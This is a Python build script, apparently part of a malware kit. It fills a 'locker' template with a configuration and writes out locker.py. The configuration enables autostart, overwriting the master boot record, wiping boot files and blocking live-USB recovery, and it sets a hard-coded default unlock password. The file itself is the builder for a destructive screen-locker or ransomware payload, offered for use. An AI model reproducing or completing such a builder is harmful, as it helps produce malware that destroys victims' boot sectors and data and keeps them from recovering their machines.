# language: Python, file: locker_builder.py
# Читает locker_template.py, подставляет CONFIG, проверяет ast.parse, пишет locker.py.

import ast
import base64
import hashlib
import json
import os
import sys

PASSWORD = os.environ.get("INPUT_PASSWORD", "8841")
AUTOSTART = os.environ.get("INPUT_AUTOSTART", "true").lower() == "true"
KILL_MBR = os.environ.get("INPUT_KILL_MBR", "true").lower() == "true"
WIPE_BOOT = os.environ.get("INPUT_WIPE_BOOT", "true").lower() == "true"
BLOCK_LIVE_USB = os.environ.get("INPUT_BLOCK_LIVE_USB", "true").lower() == "true"

SALT = b"QackBuilderSalt_2026"
PASSWORD_HASH = hashlib.sha256(SALT + PASSWORD.encode()).hexdigest()

CONFIG = {
    "password_hash": PASSWORD_HASH,
    "salt": base64.b64encode(SALT).decode(),
    "autostart": AUTOSTART,
    "kill_mbr": KILL_MBR,
    "wipe_boot": WIPE_BOOT,
    "block_live_usb": BLOCK_LIVE_USB,
}


def main() -> int:
    with open("locker_template.py", "r", encoding="utf-8") as f:
        template = f.read()

    if "__CONFIG__" not in template:
        print("ERROR: locker_template.py has no __CONFIG__ placeholder")
        return 1

    code = template.replace("__CONFIG__", repr(CONFIG))

    try:
        ast.parse(code)
    except SyntaxError as e:
        print(f"ERROR: generated code is invalid: {e}")
        print(f"Line {e.lineno}: {e.text}")
        return 1

    with open("locker.py", "w", encoding="utf-8") as f:
        f.write(code)

    print("Generated locker.py")
    print(json.dumps(CONFIG, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
